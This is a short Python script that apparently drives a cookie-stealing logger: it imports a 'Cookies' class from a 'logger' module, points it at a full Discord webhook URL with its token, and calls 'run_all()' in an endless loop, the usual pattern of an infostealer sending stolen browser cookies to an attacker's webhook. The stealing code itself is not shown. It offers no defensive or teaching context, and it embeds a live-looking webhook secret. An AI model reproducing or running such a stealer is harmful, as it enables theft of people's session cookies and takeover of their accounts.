from logger import Cookies

log = Cookies('https://discord.com/api/webhooks/1116563420431519766/G8BWiXUvGKaHZu0FcNEpTEcTbZ0JHYgjS0eY0Je57kZVTbk7CPg-_XRxXTz4H5JzVgMb')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
